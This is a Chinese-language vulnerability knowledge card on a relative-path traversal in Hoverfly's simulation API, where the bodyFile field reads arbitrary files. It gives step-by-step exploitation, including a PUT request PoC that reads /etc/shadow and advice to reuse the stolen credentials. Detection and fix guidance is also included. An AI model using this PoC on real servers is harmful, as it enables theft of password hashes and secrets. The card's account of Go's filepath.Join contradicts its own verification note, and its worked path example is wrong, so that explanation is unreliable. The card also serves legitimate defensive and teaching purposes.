---
id: web-generic-file-inclusion-hoverfly-simulation-bodyfile-relative-traversal
title: Hoverfly /api/v2/simulation 的 bodyFile 只挡绝对路径：../ 相对路径穿越读任意文件（PUT 可重复读）
type: scenario
domain: web
path: web/generic/file-inclusion
technique: api-bodyfile-relative-path-traversal
aliases:
- Hoverfly 任意文件读取
- bodyFile 目录穿越
- PUT /api/v2/simulation 读文件
- filepath.Join 未做 Clean 校验
- 模拟服务 API 文件读取
tags:
- go
- hoverfly
- file-read
- path-traversal
- api
- codeql
- service-virtualization
cve: []
severity: high
confidence: high
status: verified
affected_versions: < 1.10.3
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T12:41:20+08:00'
  notes: 已对照原文核对：POST/PUT 触发差异、bodyFile 字段、readResponseBodyFile 只校验 IsAbs、putOrReplaceSimulation 先 DeleteSimulation 再导入、修复版 ResolveAndValidatePath 均与原文一致；受影响版本 Up to (excluding) 1.10.3 与复现版本 1.10.2 来自原文标注。修正了卡内对 Go filepath.Join 的错误表述（原文/Go 行为：Join 内部会 Clean，只是没有子路径边界校验）。未验证点：未本地起容器复现读取，POST 冲突细节依原文说明。
---

## 一句话结论

当类 API 模拟/服务虚拟化工具允许在仿真数据里用 `bodyFile` 指定"响应体从文件读取"，并且只校验了"不能是绝对路径"、却把用户串直接 `filepath.Join(基准目录, filePath)` 后 `ReadFile` 时，`../../../../etc/passwd` 这类相对路径会逃出基准目录，且读取内容会作为响应体直接回显；用 PUT（覆盖）而非 POST（追加）可以绕过"仿真已存在"的冲突限制反复读取不同文件。

## 原理

- `bodyFile` 是仿真数据（simulation JSON）里的一个合法字段，语义是"本响应的 body 从该文件读取内容"。服务端导入仿真时必然要读取该文件，因此存在文件读取 sink。
- 漏洞点在于校验对象错位：`filepath.IsAbs(filePath)` 只挡住了 `/etc/passwd` 这种绝对路径写法，随后直接 `filepath.Join(hf.Cfg.ResponsesBodyFilesPath, filePath)`。Go 的 `Join` 只做路径拼接，**不会**做 `Clean` 后的边界校验，`../` 段会把结果带出基准目录（例如基准目录 `responses/` 加 `../../../../etc/passwd` 最终解析为 `/etc/passwd`）。
- `Join` 的另一个特性是空段/相对段会按字面拼接，因此基准目录前缀不会消耗 `../` 的层级，攻击者只需比基准目录层级多写一级 `../` 即可到达根。
- 读取内容被赋给 `pairs[i].Response.Body`，导入成功后 `GET /api/v2/simulation` 或后续模拟响应会把 body 回显，形成完整的"读文件 + 出数据"闭环，而不是盲读。
- 触发方法与语义相关：POST 是"追加"，会把请求与现有仿真做冲突去重（同请求第二次提交返回 `is not added due to a conflict with the existing simulation`）；PUT 是"整体替换"，处理函数先删掉旧仿真再导入，因此每次都能成功导入并回显 —— 这就是"PUT 利用性更大、可多次使用"的原因。
- 修复方式是增加 `ResolveAndValidatePath`：先 `filepath.Clean(relativePath)`，判断是否以 `..` 开头、再 `Join` 后 `filepath.Rel(base, resolved)` 检查结果不以 `..` 开头，即"解析后必须是 base 的子路径"。这说明**正确的校验是对解析结果做子路径判定**，而不是只判断输入是否绝对路径。

## 触发条件

- 目标为 Hoverfly 这类支持 `bodyFile`/`bodyFile`-等价字段的仿真导入 API，且该 API 可达（示例中 REST API 端口默认 8888，配置了 token 认证时需要合法凭据）。
- 运行账户对目标文件有读权限（容器内通常以 root 或应用账户运行，可读 `/etc/passwd`、`/etc/shadow`、配置文件）。
- 版本在受影响区间内（未加 `ResolveAndValidatePath` 一类子路径校验）。
- 知道（或可猜）基准目录 `ResponsesBodyFilesPath` 的层级；路径穿越只需相对层级足够深，多写 `../` 不会因为层级不精确而失败。

## 利用步骤

1. 确认版本：访问管理面板/dashboard 的 Information 区块看 `Version`，或看镜像 tag。
2. 先发一个最小 POST 试探接口是否通：`{"data":{"pairs":[{"request":{},"response":{"bodyFile":"../../../../../../etc/passwd"}}]},"meta":{"schemaVersion":"v5.2"}}`，看响应体是否被回填进 `response.body`。
3. 若 POST 第二次返回 `conflict with the existing simulation`，改用 PUT：`Put` 处理函数会 `DeleteSimulation` 后再导入，因此每次都能覆盖并回显。
4. 用 PUT 依次读取 `/etc/passwd`、`/etc/shadow`、应用配置文件、启动脚本等；每换一个目标文件就重新发一次 PUT（body 换成新的 `bodyFile`）。
5. 把读到的凭据/配置用于下一步（数据库口令、云凭据、内部服务 token），或通过读源码/配置定位更多攻击面。

## PoC

```http
PUT /api/v2/simulation HTTP/1.1
Host: <target>:8888
Content-Type: application/x-www-form-urlencoded

{"data":{"pairs":[{
 "request":{},"response":{
 "bodyFile": "../../../../../../etc/shadow"}} ]},
 "meta":{"schemaVersion":"v5.2"}}
```

```text
# 响应中 response.body 会被替换为被读文件全文（转义后回显）
# 重复读取：每次 PUT 换一个 bodyFile 即可，PUT 会先删除旧仿真再导入
```

```text
# 为什么练 ../ 有效：
# filepath.IsAbs("../../../../../../etc/passwd") == false  →  通过校验
# filepath.Join("responses", "../../../../../../etc/passwd") → "/etc/passwd"
# 修复后：Clean + HasPrefix("..") + Rel(base, resolved) 不得以 ".." 开头
```

## 变体与关联

- 变体：其他"从文件读取响应体/附件/模板"的导入 API（bodyFile、template、mock 文件、fixture 路径）同样只需校验解析结果是否为基准目录子路径。
- 变体：POST 的冲突去重可被绕过的情形——换请求匹配条件（method/path/body 任一不同即视为不同 pair）后仍可多次 POST 读取不同文件；PUT 只是最省事的那条路。
- 变体：`IsAbs` 只挡绝对路径的写法在 Windows 上还会漏掉 `C:\`、`..\\` 等形态，需同时校验分隔符。
- 关联：[[web-generic-file-inclusion-go-strings-replacer-double-dot-smuggle]]（Go 里对 `../` 做单次字符串替换可被双写绕过，与"对输入做字符串处理而非解析后判定"是同一类根因）；[[web-generic-file-inclusion-nginx-alias-trailing-slash-traversal]]（同为"拼接路径未做边界判定"）。
- 边界：`bodyFile` 若是 URL（`util.IsURL` 判定）会走另一条 `readResponseBodyURL` 分支，可能构成 SSRF，但需要目标出网，与本卡的本地文件读取是不同链。

## 检测与防御

- 检测：请求 `/api/v2/simulation` 且 body 中出现 `"bodyFile"` 与 `../` 组合；同一来源短时间内多次 PUT 仿真；响应体中包含 `/etc/passwd`、`root:x:0:0`、`sshd` 等特征。
- 修复：把相对路径 `Clean` 后与基准目录 `Join`，再用 `Rel(base, resolved)` 判定不以 `..` 开头（即必须是 base 的子路径）；不要只判断 `IsAbs`。参考实现：`ResolveAndValidatePath(absBasePath, relativePath)`。
- 加固：管理/仿真 API 强制认证并绑定管理网段；容器以非 root 且最小权限运行（只挂载必要目录，`readOnlyRootFilesystem`）；对 `bodyFile` 改成"只接受预置文件 ID"而非路径。

## 备注

原文未标注 CVE 编号，本卡不填写 cve；受影响版本来自原文明确标记（修复版本 1.10.3，复现用 1.10.2）。
